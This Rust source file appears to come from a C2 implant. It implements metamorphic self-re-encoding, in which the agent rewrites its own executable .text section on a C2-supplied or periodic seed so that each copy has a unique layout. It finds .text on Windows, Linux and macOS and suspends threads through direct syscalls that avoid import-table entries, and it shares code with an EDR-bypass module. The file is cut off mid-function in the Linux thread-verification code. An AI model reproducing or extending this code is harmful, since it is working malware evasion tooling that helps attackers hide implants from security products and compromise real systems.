//! Build-time self-re-encoding ("Metamorphic Lite").
//!
//! This module applies the `code_transform` pipeline to the agent's own
//! `.text` section at runtime with a fresh random seed.  The re-encoding runs:
//!
//! 1. Once after the first C2 check-in (seed supplied by the server).
//! 2. Periodically at a configurable interval (default: 4 hours).
//!
//! Each invocation produces a unique binary layout because the seed is
//! derived from `timestamp ⊕ server_nonce`, yielding a limited metamorphic
//! capability — the agent re-encodes itself in-place without human
//! intervention.
//!
//! # Safety
//!
//! This module modifies executable memory in-place.  Before changing page
//! protections, all sibling OS threads are suspended via `NtSuspendThread`
//! (Windows) or `SIGSTOP` via `tgkill` (Linux).  Threads are resumed after
//! the instruction-cache flush completes.
//!
//! The clean ntdll mapping used for the syscall gadget is **not** touched —
//! only the agent's own `.text` section is rewritten.

#![cfg(feature = "self-reencode")]

use anyhow::{Context, Result};
use chacha20poly1305::aead::OsRng;
use hkdf::Hkdf;
use rand::RngCore;
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

/// Seed for the next re-encoding pass.  Set by the C2 server via
/// `Command::SetReencodeSeed`; defaults to a hash of the session key so
/// the feature is active from the first cycle even without C2 input.
static CURRENT_SEED: AtomicU64 = AtomicU64::new(0);

/// Interval between automatic re-encoding passes.  Updated from config.
static REENCODE_INTERVAL_SECS: AtomicU64 = AtomicU64::new(DEFAULT_REENCODE_INTERVAL_SECS);

/// Default re-encoding interval: 4 hours.
pub const DEFAULT_REENCODE_INTERVAL_SECS: u64 = 4 * 3600;

/// Derive a non-zero default seed from the session key material mixed with
/// OS-provided randomness.
///
/// Uses the first 8 bytes of the SHA-256 hash of `(session_key || os_rng_bytes)`,
/// ensuring the re-encode feature is active from the first cycle even before the
/// C2 server sends `SetReencodeSeed`.  Mixing in `OsRng` ensures that two agents
/// sharing the same session key will still produce different seeds.
///
/// # Security note (P2-07)
///
/// The returned seed is **not a cryptographic key** and must **never** be used
/// as one.  It is derived by truncating a SHA-256 digest to 8 bytes (64 bits),
/// which is insufficient for cryptographic key material.  The seed is used solely
/// as an obfuscation parameter for the self-reencoding transform — a
/// non-cryptographic defence-in-depth layer.  If future use requires more than
/// 64 bits of entropy, consume the full 32-byte SHA-256 output rather than the
/// truncated 8-byte form.
///
/// Returns the derived seed and a static string indicating the source
/// ("auto-derived" for this path vs "c2-supplied" for `set_seed`).
pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
    use sha2::Digest;
    // P2-11: Mix in OsRng bytes alongside the session key hash.
    let mut os_bytes = [0u8; 32];
    rand::rngs::OsRng.fill_bytes(&mut os_bytes);
    let mut hasher = Sha256::new();
    hasher.update(session_key);
    hasher.update(&os_bytes);
    let hash = hasher.finalize();
    let seed = u64::from_le_bytes(hash[..8].try_into().expect("slice is 8 bytes"));
    // Ensure non-zero
    let seed = if seed == 0 { 1u64 } else { seed };
    tracing::info!(
        "self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng"
    );
    seed
}

/// Set the seed that will be used for the next re-encoding pass.
///
/// Logs the seed source as "c2-supplied" so operators can distinguish
/// between a C2-sent seed and the auto-derived default.
pub fn set_seed(seed: u64) {
    CURRENT_SEED.store(seed, Ordering::SeqCst);
    tracing::info!("self_reencode: seed updated to 0x{seed:016x} (source: c2-supplied)");
}

/// Get the current seed.
pub fn current_seed() -> u64 {
    CURRENT_SEED.load(Ordering::SeqCst)
}

/// Update the re-encoding interval (in seconds).
pub fn set_interval_secs(secs: u64) {
    if secs > 0 {
        REENCODE_INTERVAL_SECS.store(secs, Ordering::SeqCst);
        tracing::info!("self_reencode: interval updated to {secs}s");
    }
}

/// Derive a fresh seed from cryptographically secure random bytes using
/// HKDF-SHA256 with the C2-provided nonce as salt.
///
/// P1-23: Previous implementation XORed `thread_rng()` output with the
/// server nonce, which is not a proper KDF.  This version uses HKDF-SHA256
/// with `OsRng` for the input keying material, the server nonce as salt,
/// and a domain-separated info string, producing a cryptographically
/// uniform 8-byte seed.
pub fn derive_fresh_seed(server_nonce: u64) -> u64 {
    use rand::RngCore;
    let mut rand_bytes = [0u8; 32];
    OsRng.fill_bytes(&mut rand_bytes);

    let salt = server_nonce.to_le_bytes();
    let hkdf = Hkdf::<Sha256>::new(Some(&salt), &rand_bytes);
    let mut seed_bytes = [0u8; 8];
    hkdf.expand(common::hkdf_info::REENCODE_SEED, &mut seed_bytes)
        .expect("HKDF expand for reencode seed must succeed");

    let seed = u64::from_le_bytes(seed_bytes);
    // Ensure the seed is non-zero (zero would produce the same output
    // regardless of input — ChaCha8RNG with zero seed is still valid but
    // using a non-zero value avoids the degenerate "always same" case if
    // someone passes 0 as the nonce).
    if seed == 0 {
        1
    } else {
        seed
    }
}

// ── Platform-specific .text section location ──────────────────────────────

/// Represents the location and size of the agent's own `.text` section in
/// memory.
#[derive(Debug, Clone)]
pub struct TextSection {
    pub base: usize,
    pub size: usize,
}

/// Find the `.text` section of the current executable / DLL in memory.
///
/// On **Windows**, walks the PE headers from the module base (resolved via
/// `pe_resolve` hash of the host module).  On **Linux**, parses
/// `/proc/self/maps` and the ELF headers to find the executable segment
/// backed by the main binary.
///
/// Returns `None` if the section cannot be located.
pub fn find_text_section() -> Result<TextSection> {
    #[cfg(windows)]
    {
        find_text_section_windows()
    }
    #[cfg(target_os = "linux")]
    {
        find_text_section_linux()
    }
    #[cfg(target_os = "macos")]
    {
        find_text_section_macos()
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        anyhow::bail!("self_reencode: unsupported platform for .text section discovery");
    }
}

#[cfg(windows)]
fn find_text_section_windows() -> Result<TextSection> {
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;

    // Resolve the agent's own module base.  The agent can be either the main
    // EXE or a DLL loaded into another process.  Read PEB.ImageBaseAddress
    // directly to avoid a GetModuleHandleW(NULL) IAT entry.
    let base = unsafe {
        // PEB.ImageBaseAddress is at offset 0x10 (PVOID).
        let peb: *mut u8;
        #[cfg(target_arch = "x86_64")]
        {
            // PEB is at GS:[0x60] on x86_64 Windows.
            std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        }
        #[cfg(target_arch = "aarch64")]
        {
            // On ARM64 Windows, TPIDR_EL0 holds the TEB pointer.
            // PEB pointer is at TEB+0x60 (same offset as gs:[0x60] on x86-64).
            let teb: *mut u8;
            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
            peb = *(teb.add(0x60) as *const *mut u8);
        }
        let base_ptr = (peb as *const usize).add(0x10 / std::mem::size_of::<usize>());
        base_ptr.read() as usize
    };
    if base == 0 {
        anyhow::bail!("self_reencode: could not resolve own module base");
    }

    unsafe {
        let dos = &*(base as *const IMAGE_DOS_HEADER);
        if dos.e_magic != 0x5A4D {
            // 'MZ'
            anyhow::bail!("self_reencode: invalid DOS signature at base {base:#x}");
        }
        let nt = &*((base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
        if nt.Signature != 0x4550 {
            // 'PE'
            anyhow::bail!("self_reencode: invalid PE signature");
        }

        let section_table_offset = dos.e_lfanew as usize
            + std::mem::size_of::<u32>() // Signature
            + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
            + nt.FileHeader.SizeOfOptionalHeader as usize;

        let sections = std::slice::from_raw_parts(
            (base + section_table_offset)
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER,
            nt.FileHeader.NumberOfSections as usize,
        );

        for sec in sections {
            // .text section name is ".text\0\0\0" (8 bytes, null-padded).
            if &sec.Name[..5] == b".text" {
                let text_base = base + sec.VirtualAddress as usize;
                let text_size = sec.Misc.VirtualSize as usize;
                tracing::debug!(
                    "self_reencode: found .text at {:#x}, size={} bytes",
                    text_base,
                    text_size
                );
                return Ok(TextSection {
                    base: text_base,
                    size: text_size,
                });
            }
        }
        anyhow::bail!("self_reencode: no .text section found in PE headers");
    }
}

#[cfg(target_os = "linux")]
fn find_text_section_linux() -> Result<TextSection> {
    // Parse the ELF headers of /proc/self/exe to find the .text section.
    // We read the binary file and look up the section header table.
    let exe_data =
        std::fs::read("/proc/self/exe").context("self_reencode: failed to read /proc/self/exe")?;

    let elf = goblin::elf::Elf::parse(&exe_data)
        .map_err(|e| anyhow::anyhow!("self_reencode: failed to parse ELF headers: {e}"))?;

    for sh in &elf.section_headers {
        if let Some(name) = elf.shdr_strtab.get_at(sh.sh_name) {
            if name == ".text" {
                // The section's virtual address is relative to the load base.
                // For a PIE binary, the actual runtime address is base + sh_addr.
                // We can determine the base by comparing a known symbol's file
                // offset with its runtime address via /proc/self/maps.
                let load_base = find_load_base()?;
                let text_base = (load_base + sh.sh_addr as usize) as usize;
                let text_size = sh.sh_size as usize;
                tracing::debug!(
                    "self_reencode: found .text at {:#x}, size={} bytes (load_base={:#x}, sh_addr={:#x})",
                    text_base,
                    text_size,
                    load_base,
                    sh.sh_addr
                );
                return Ok(TextSection {
                    base: text_base,
                    size: text_size,
                });
            }
        }
    }
    anyhow::bail!("self_reencode: no .text section found in ELF headers");
}

#[cfg(target_os = "macos")]
fn find_text_section_macos() -> Result<TextSection> {
    use std::ffi::c_void;

    const MH_MAGIC_64: u32 = 0xfeed_facf;
    const MH_CIGAM_64: u32 = 0xcffa_edfe;
    const LC_SEGMENT_64: u32 = 0x19;

    #[repr(C)]
    struct MachHeader64 {
        magic: u32,
        cputype: i32,
        cpusubtype: i32,
        filetype: u32,
        ncmds: u32,
        sizeofcmds: u32,
        flags: u32,
        reserved: u32,
    }

    #[repr(C)]
    struct LoadCommand {
        cmd: u32,
        cmdsize: u32,
    }

    #[repr(C)]
    struct SegmentCommand64 {
        cmd: u32,
        cmdsize: u32,
        segname: [u8; 16],
        vmaddr: u64,
        vmsize: u64,
        fileoff: u64,
        filesize: u64,
        maxprot: i32,
        initprot: i32,
        nsects: u32,
        flags: u32,
    }

    #[repr(C)]
    struct Section64 {
        sectname: [u8; 16],
        segname: [u8; 16],
        addr: u64,
        size: u64,
        offset: u32,
        align: u32,
        reloff: u32,
        nreloc: u32,
        flags: u32,
        reserved1: u32,
        reserved2: u32,
        reserved3: u32,
    }

    fn name_eq(actual: &[u8; 16], expected: &[u8]) -> bool {
        let len = actual.iter().position(|&b| b == 0).unwrap_or(actual.len());
        &actual[..len] == expected
    }

    let mut info: libc::Dl_info = unsafe { std::mem::zeroed() };
    let symbol = reencode_text as *const () as *const c_void;
    if unsafe { libc::dladdr(symbol, &mut info as *mut libc::Dl_info) } == 0 {
        anyhow::bail!("self_reencode: dladdr failed while locating module base");
    }
    if info.dli_fbase.is_null() {
        anyhow::bail!("self_reencode: dladdr returned null module base");
    }

    let base = info.dli_fbase as usize;
    unsafe {
        let header = &*(base as *const MachHeader64);
        if header.magic != MH_MAGIC_64 && header.magic != MH_CIGAM_64 {
            anyhow::bail!(
                "self_reencode: invalid Mach-O 64-bit magic at base {:#x}: {:#x}",
                base,
                header.magic
            );
        }

        let mut cmd_ptr = base + std::mem::size_of::<MachHeader64>();
        let commands_end = cmd_ptr
            .checked_add(header.sizeofcmds as usize)
            .ok_or_else(|| anyhow::anyhow!("self_reencode: Mach-O load command bounds overflow"))?;

        for _ in 0..header.ncmds {
            if cmd_ptr + std::mem::size_of::<LoadCommand>() > commands_end {
                anyhow::bail!("self_reencode: truncated Mach-O load command table");
            }

            let lc = &*(cmd_ptr as *const LoadCommand);
            if (lc.cmdsize as usize) < std::mem::size_of::<LoadCommand>()
                || cmd_ptr + lc.cmdsize as usize > commands_end
            {
                anyhow::bail!(
                    "self_reencode: malformed Mach-O load command size {}",
                    lc.cmdsize
                );
            }

            if lc.cmd == LC_SEGMENT_64 {
                if (lc.cmdsize as usize) < std::mem::size_of::<SegmentCommand64>() {
                    anyhow::bail!("self_reencode: malformed LC_SEGMENT_64 command");
                }

                let seg = &*(cmd_ptr as *const SegmentCommand64);
                if name_eq(&seg.segname, b"__TEXT") {
                    let mut sec_ptr = cmd_ptr + std::mem::size_of::<SegmentCommand64>();
                    let segment_end = cmd_ptr + lc.cmdsize as usize;

                    for _ in 0..seg.nsects as usize {
                        if sec_ptr + std::mem::size_of::<Section64>() > segment_end {
                            break;
                        }

                        let sec = &*(sec_ptr as *const Section64);
                        if name_eq(&sec.sectname, b"__text") {
                            if sec.addr < seg.vmaddr {
                                anyhow::bail!(
                                    "self_reencode: __text addr {:#x} is below __TEXT vmaddr {:#x}",
                                    sec.addr,
                                    seg.vmaddr
                                );
                            }

                            let text_base = base + (sec.addr as usize - seg.vmaddr as usize);
                            let text_size = sec.size as usize;
                            if text_size == 0 {
                                anyhow::bail!("self_reencode: Mach-O __text section is empty");
                            }

                            tracing::debug!(
                                "self_reencode: found macOS __text at {:#x}, size={} bytes",
                                text_base,
                                text_size
                            );
                            return Ok(TextSection {
                                base: text_base,
                                size: text_size,
                            });
                        }

                        sec_ptr += std::mem::size_of::<Section64>();
                    }
                }
            }

            cmd_ptr += lc.cmdsize as usize;
        }
    }

    anyhow::bail!("self_reencode: no __TEXT,__text section found in loaded Mach-O image")
}

/// Determine the ASLR base address of the main executable on Linux by
/// parsing `/proc/self/maps`.
#[cfg(target_os = "linux")]
fn find_load_base() -> Result<usize> {
    let maps = std::fs::read_to_string("/proc/self/maps")
        .context("self_reencode: failed to read /proc/self/maps")?;
    let exe_path =
        std::fs::read_link("/proc/self/exe").unwrap_or_else(|_| std::path::PathBuf::from(""));
    let exe_name = exe_path.to_string_lossy();

    for line in maps.lines() {
        // The first mapping backed by the executable is the text segment.
        if line.contains(exe_name.as_ref()) {
            let parts: Vec<&str> = line.splitn(2, '-').collect();
            if let Ok(base) = usize::from_str_radix(parts[0], 16) {
                return Ok(base);
            }
        }
    }
    anyhow::bail!("self_reencode: could not determine load base from /proc/self/maps")
}

// ── Thread-freeze infrastructure ──────────────────────────────────────────
//
// Before rewriting the .text section we must suspend all sibling threads so
// that no CPU is executing code in the region whose page protections are about
// to change.  The original comment claimed cooperative scheduling gives
// exclusive CPU access — this is incorrect for OS threads outside the tokio
// runtime (e.g. blocking helper threads, background I/O threads).

/// Maximum time threads may be frozen before a warning is emitted.
const FREEZE_WARN_SECS: u64 = 30;

// ── Windows thread freeze ─────────────────────────────────────────────────

/// Suspended thread state.  On drop, any threads that have not yet been
// P1-03: Made pub(crate) so edr_bypass_transform can share the same
// thread-freeze infrastructure (avoids duplicating ~200 lines of NT
// thread-enumeration code).
#[cfg(windows)]
pub(crate) struct FrozenThreads {
    /// (thread handle, previous suspend count) for each suspended thread.
    handles: Vec<(usize, u32)>,
    /// Instant when `freeze_threads()` finished suspending.
    frozen_at: std::time::Instant,
    /// Whether `thaw()` has already been called.
    thawed: bool,
}

#[cfg(windows)]
impl FrozenThreads {
    /// Resume all frozen threads in reverse suspension order, close handles.
    pub(crate) fn thaw(&mut self) {
        if self.thawed {
            return;
        }
        self.thawed = true;

        let elapsed = self.frozen_at.elapsed();
        if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
            tracing::warn!(
                "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
                elapsed.as_secs_f64()
            );
        }

        while let Some((handle, _prev)) = self.handles.pop() {
            let mut dummy: u32 = 0;
            let _ = crate::syscalls::get_syscall_id("NtResumeThread").map(|t| unsafe {
                crate::syscalls::do_syscall(
                    t.ssn,
                    t.gadget_addr,
                    &[handle as u64, &mut dummy as *mut u32 as u64],
                )
            });
            let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
                crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64])
            });
        }
        tracing::debug!("self_reencode: all sibling threads resumed");
    }
}

#[cfg(windows)]
impl Drop for FrozenThreads {
    fn drop(&mut self) {
        if !self.thawed {
            tracing::warn!(
                "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
            );
            self.thaw();
        }
    }
}

/// Read the current thread ID from the TEB without calling kernel32.
#[cfg(all(windows, target_arch = "x86_64"))]
fn current_tid() -> usize {
    unsafe {
        let teb: *mut u8;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
        // TEB.ClientId is at offset 0x40; UniqueThread at 0x48.
        ((teb as *const usize).add(0x48 / std::mem::size_of::<usize>())).read()
    }
}

/// Read the current process ID from the TEB without calling kernel32.
#[cfg(all(windows, target_arch = "x86_64"))]
fn current_pid() -> usize {
    unsafe {
        let teb: *mut u8;
        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
        // TEB.ClientId.UniqueProcess at offset 0x40.
        ((teb as *const usize).add(0x40 / std::mem::size_of::<usize>())).read()
    }
}

/// Read the current thread ID from the TEB via TPIDR_EL0 (ARM64 Windows).
#[cfg(all(windows, target_arch = "aarch64"))]
fn current_tid() -> usize {
    unsafe {
        let teb: *mut u8;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
        // TEB.ClientId is at offset 0x40; UniqueThread at 0x48.
        ((teb as *const usize).add(0x48 / std::mem::size_of::<usize>())).read()
    }
}

/// Read the current process ID from the TEB via TPIDR_EL0 (ARM64 Windows).
#[cfg(all(windows, target_arch = "aarch64"))]
fn current_pid() -> usize {
    unsafe {
        let teb: *mut u8;
        std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
        // TEB.ClientId.UniqueProcess at offset 0x40.
        ((teb as *const usize).add(0x40 / std::mem::size_of::<usize>())).read()
    }
}

/// threads, `NtOpenThread` + `NtSuspendThread` to freeze them.  All NT
/// functions are resolved via `crate::syscalls` (PEB-walk SSN resolution) — no
/// kernel32 IAT entries are added.
#[cfg(windows)]
pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
    use crate::win_types::OBJECT_ATTRIBUTES;

    // ── NT structures for NtQuerySystemInformation(SystemProcessInformation) ──
    //
    // We use raw byte offsets into SYSTEM_PROCESS_INFORMATION rather than a
    // full `#[repr(C)]` struct because the header is large and the layout
    // has been stable on 64-bit Windows since Windows XP.
    //
    // Key offsets (x86_64):
    //   +0x000  NextEntryOffset   (ULONG, 4)
    //   +0x004  NumberOfThreads   (ULONG, 4)
    //   +0x050  UniqueProcessId   (HANDLE, 8)
    //   +0x100  Threads[0]        (SYSTEM_THREAD_INFORMATION array)
    //
    // SYSTEM_THREAD_INFORMATION per thread (x86_64, stride = 0x50):
    //   +0x028  ClientId.UniqueProcess (HANDLE, 8)
    //   +0x030  ClientId.UniqueThread  (HANDLE, 8)

    const SPI_NEXT_ENTRY_OFFSET: usize = 0x000;
    const SPI_NUMBER_OF_THREADS: usize = 0x004;
    const SPI_UNIQUE_PROCESS_ID: usize = 0x050;
    const SPI_THREADS_START: usize = 0x100;

    const STI_STRIDE: usize = 0x050;
    const STI_CLIENT_ID_THREAD: usize = 0x030;

    const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
    const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;

    const THREAD_SUSPEND_RESUME: u32 = 0x0002;

    let my_tid = current_tid();
    let my_pid = current_pid();

    // ── Query SystemProcessInformation ───────────────────────────────────

    let mut buf_len: u32 = 0x1_0000; // start with 64 KiB
    let buf: Vec<u8> = loop {
        let mut buf = vec![0u8; buf_len as usize];
        let mut return_len: u32 = 0;
        let status = crate::syscalls::get_syscall_id("NtQuerySystemInformation")
            .map(|t| unsafe {
                crate::syscalls::do_syscall(
                    t.ssn,
                    t.gadget_addr,
                    &[
                        SYSTEM_PROCESS_INFORMATION_CLASS as u64,
                        buf.as_mut_ptr() as u64,
                        buf_len as u64,
                        &mut return_len as *mut u32 as u64,
                    ],
                )
            })
            .map_err(|e| anyhow::anyhow!("NtQuerySystemInformation resolve failed: {e}"))?;

        if status >= 0 {
            break buf;
        }
        if (status as u32) == STATUS_INFO_LENGTH_MISMATCH {
            buf_len = return_len.max(buf_len * 2);
            continue;
        }
        anyhow::bail!(
            "NtQuerySystemInformation returned NTSTATUS {:#010x}",
            status
        );
    };

    // ── Walk the linked list to find our process ─────────────────────────

    let mut offset = 0usize;
    let mut found = false;

    loop {
        if offset + SPI_THREADS_START >= buf.len() {
            anyhow::bail!(
                "self_reencode: SYSTEM_PROCESS_INFORMATION buffer too small at offset {offset:#x}"
            );
        }

        let next_entry = u32::from_ne_bytes(
            buf[offset + SPI_NEXT_ENTRY_OFFSET..][..4]
                .try_into()
                .unwrap(),
        );
        let num_threads = u32::from_ne_bytes(
            buf[offset + SPI_NUMBER_OF_THREADS..][..4]
                .try_into()
                .unwrap(),
        );
        let pid = usize::from_ne_bytes(
            buf[offset + SPI_UNIQUE_PROCESS_ID..][..8]
                .try_into()
                .unwrap(),
        );

        if pid == my_pid {
            found = true;

            // ── Suspend sibling threads ──────────────────────────────────

            let mut handles: Vec<(usize, u32)> = Vec::with_capacity(num_threads as usize);
            let threads_base = offset + SPI_THREADS_START;

            for i in 0..num_threads as usize {
                let ti = threads_base + i * STI_STRIDE;
                if ti + STI_STRIDE > buf.len() {
                    break;
                }
                let tid =
                    usize::from_ne_bytes(buf[ti + STI_CLIENT_ID_THREAD..][..8].try_into().unwrap());

                // Skip the calling thread.
                if tid == my_tid {
                    continue;
                }

                // Open a handle with THREAD_SUSPEND_RESUME access.
                let mut obj_attr: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
                obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

                // CLIENT_ID { UniqueProcess, UniqueThread }
                #[repr(C)]
                struct ClientId {
                    unique_process: usize,
                    unique_thread: usize,
                }
                let cid = ClientId {
                    unique_process: 0, // match any process
                    unique_thread: tid,
                };

                let mut handle: usize = 0;
                let open_status = crate::syscalls::get_syscall_id("NtOpenThread").map(|t| unsafe {
                    crate::syscalls::do_syscall(
                        t.ssn,
                        t.gadget_addr,
                        &[
                            &mut handle as *mut usize as u64,
                            THREAD_SUSPEND_RESUME as u64,
                            &obj_attr as *const OBJECT_ATTRIBUTES as u64,
                            &cid as *const ClientId as u64,
                        ],
                    )
                });

                match open_status {
                    Ok(s) if s >= 0 => {
                        // Successfully opened — suspend it.
                        let mut prev_suspend: u32 = 0;
                        let susp_status =
                            crate::syscalls::get_syscall_id("NtSuspendThread").map(|t| unsafe {
                                crate::syscalls::do_syscall(
                                    t.ssn,
                                    t.gadget_addr,
                                    &[handle as u64, &mut prev_suspend as *mut u32 as u64],
                                )
                            });
                        match susp_status {
                            Ok(s) if s >= 0 => {
                                handles.push((handle, prev_suspend));
                            }
                            Ok(s) => {
                                tracing::warn!(
                                    "self_reencode: NtSuspendThread(tid={:#x}) returned {:#010x}, closing handle",
                                    tid, s
                                );
                                let _ =
                                    crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
                                        crate::syscalls::do_syscall(
                                            t.ssn,
                                            t.gadget_addr,
                                            &[handle as u64],
                                        )
                                    });
                            }
                            Err(e) => {
                                tracing::warn!(
                                    "self_reencode: NtSuspendThread resolve failed for tid={:#x}: {e}, closing handle",
                                    tid
                                );
                                let _ =
                                    crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
                                        crate::syscalls::do_syscall(
                                            t.ssn,
                                            t.gadget_addr,
                                            &[handle as u64],
                                        )
                                    });
                            }
                        }
                    }
                    Ok(s) => {
                        // Access denied or similar — skip silently.
                        tracing::debug!(
                            "self_reencode: NtOpenThread(tid={:#x}) returned {:#010x}, skipping",
                            tid,
                            s
                        );
                    }
                    Err(e) => {
                        tracing::debug!(
                            "self_reencode: NtOpenThread resolve failed for tid={:#x}: {e}",
                            tid
                        );
                    }
                }
            }

            // ── Verify thread suspension ─────────────────────────────────
            //
            // CRIT-002: NtSuspendThread can return success (STATUS_SUCCESS) even
            // if the thread is not yet actually suspended (e.g. the thread was in
            // a kernel wait that hasn't completed).  We verify by calling
            // WaitForSingleObject with a 0 ms timeout on each handle.  A suspended
            // thread will NOT be signaled, so WaitForSingleObject returns
            // WAIT_TIMEOUT (0x102).  If the thread terminated despite our
            // suspension attempt, WaitForSingleObject returns WAIT_OBJECT_0 (0).
            //
            // If any thread fails verification, we abort the re-encoding pass to
            // avoid rewriting .text under a still-running sibling.

            let wait_result = crate::syscalls::get_syscall_id("NtWaitForSingleObject");
            if let Ok(wait_sys) = wait_result {
                // LARGE_INTEGER timeout = -100000 (100ns units) → 10 ms.
                // Negative means relative timeout.
                let timeout_100ns: i64 = -100_000i64; // 10 ms in 100ns units
                let mut unverified_count = 0u32;

                for &(handle, _) in &handles {
                    let mut wait_status: i32 = 0;
                    let status = unsafe {
                        crate::syscalls::do_syscall(
                            wait_sys.ssn,
                            wait_sys.gadget_addr,
                            &[
                                handle as u64,                       // Handle
                                0u64,                                // Alertable = FALSE
                                &timeout_100ns as *const i64 as u64, // Timeout (large integer)
                            ],
                        )
                    };

                    // NtWaitForSingleObject returns:
                    //   STATUS_WAIT_0 (0)       → thread is signaled (terminated!)
                    //   STATUS_TIMEOUT (0x102)   → thread is NOT signaled (still suspended) ✓
                    //   Other                    → unexpected, treat as failure
                    if status != 0x00000102i32 {
                        unverified_count += 1;
                        tracing::error!(
                            "self_reencode: thread handle {:#x} verification FAILED — NtWaitForSingleObject returned {:#010x} (expected STATUS_TIMEOUT=0x102)",
                            handle,
                            status
                        );
                    }
                }

                if unverified_count > 0 {
                    tracing::error!(
                        "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting re-encoding pass"
                    );
                    // Resume all threads we suspended and return an error.
                    for (handle, _) in handles {
                        let mut dummy: u32 = 0;
                        let _ = crate::syscalls::get_syscall_id("NtResumeThread").map(|t| unsafe {
                            crate::syscalls::do_syscall(
                                t.ssn,
                                t.gadget_addr,
                                &[handle as u64, &mut dummy as *mut u32 as u64],
                            )
                        });
                        let _ = crate::syscalls::get_syscall_id("NtClose").map(|t| unsafe {
                            crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[handle as u64])
                        });
                    }
                    anyhow::bail!(
                        "self_reencode: {unverified_count} thread(s) failed suspension verification — aborting to prevent .text corruption"
                    );
                }
            } else {
                tracing::warn!(
                    "self_reencode: could not resolve NtWaitForSingleObject for suspension verification — proceeding without verification (risk: .text may be rewritten under running threads)"
                );
            }

            tracing::info!(
                "self_reencode: froze and verified {} sibling threads (my_tid={:#x})",
                handles.len(),
                my_tid
            );

            return Ok(FrozenThreads {
                handles,
                frozen_at: std::time::Instant::now(),
                thawed: false,
            });
        }

        // Advance to the next process entry.
        if next_entry == 0 {
            break;
        }
        offset += next_entry as usize;
    }

    if !found {
        anyhow::bail!(
            "self_reencode: could not find current process (pid={:#x}) in SystemProcessInformation",
            my_pid
        );
    }

    // Unreachable, but the compiler doesn't know that.
    anyhow::bail!("self_reencode: unexpected end of thread enumeration");
}

// P1-03: Made pub(crate) so edr_bypass_transform can share the same
// thread-freeze infrastructure.
#[cfg(target_os = "linux")]
pub(crate) struct FrozenThreads {
    /// TIDs that were sent SIGSTOP.
    tids: Vec<i32>,
    /// Process ID (needed for tgkill to resume).
    pid: i32,
    /// Instant when freeze completed.
    frozen_at: std::time::Instant,
    /// Whether `thaw()` has already been called.
    thawed: bool,
}

#[cfg(target_os = "linux")]
impl FrozenThreads {
    pub(crate) fn thaw(&mut self) {
        if self.thawed {
            return;
        }
        self.thawed = true;

        let elapsed = self.frozen_at.elapsed();
        if elapsed > Duration::from_secs(FREEZE_WARN_SECS) {
            tracing::warn!(
                "self_reencode: threads were frozen for {:.1}s (>{FREEZE_WARN_SECS}s threshold)",
                elapsed.as_secs_f64()
            );
        }

        // Resume in reverse order.
        while let Some(tid) = self.tids.pop() {
            let _ = unsafe {
                libc::syscall(
                    libc::SYS_tgkill,
                    self.pid,
                    tid,
                    libc::SIGCONT as libc::c_long,
                )
            };
        }
        tracing::debug!("self_reencode: all sibling threads resumed (SIGCONT)");
    }
}

#[cfg(target_os = "linux")]
impl Drop for FrozenThreads {
    fn drop(&mut self) {
        if !self.thawed {
            tracing::warn!(
                "self_reencode: FrozenThreads dropped without explicit thaw — auto-resuming"
            );
            self.thaw();
        }
    }
}

/// Reads `/proc/self/task/` to enumerate TIDs and sends `SIGSTOP` via
/// `tgkill` to each non-current thread.
#[cfg(target_os = "linux")]
pub(crate) fn freeze_threads() -> Result<FrozenThreads> {
    let pid = unsafe { libc::getpid() };
    let my_tid = unsafe { libc::gettid() };

    let task_dir =
        std::fs::read_dir("/proc/self/task").context("self_reencode: read /proc/self/task")?;

    let mut tids: Vec<i32> = Vec::new();

    for entry in task_dir.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        if let Ok(tid) = name_str.parse::<i32>() {
            if tid == my_tid {
                continue;
            }
            // Send SIGSTOP via tgkill (not kill, to be precise about target).
            let ret =
                unsafe { libc::syscall(libc::SYS_tgkill, pid, tid, libc::SIGSTOP as libc::c_long) };
            if ret == 0 {
                tids.push(tid);
            } else {
                tracing::debug!(
                    "self_reencode: tgkill(SIGSTOP, tid={}) failed: {}",
                    tid,
                    std::io::Error::last_os_error()
                );
            }
        }
    }

    tracing::info!(
        "self_reencode: froze {} sibling threads (my_tid={})",
        tids.len(),
        my_tid
    );

    // ── Verify thread suspension (CRIT-002) ──────────────────────────────
    //
    // After sending SIGSTOP to each sibling, verify each thread is actually
    // in the stopped state by reading /proc/self/task/{tid}/status.  The
    // `State:` line should read `T (stopped)` for a SIGSTOP'd thread.
    //
    // Because SIGSTOP delivery is asynchronous (the kernel must schedule the
    // target thread to dequeue the signal), we retry with backoff instead of
    // a single immediate check.  This avoids aborting valid re-encoding passes
    // on busy systems where signal delivery is slightly delayed.
    //
    // If any thread is not stopped after all retries, we abort the re-encoding
    // pass to avoid rewriting .text under a still-running sibling.
    {
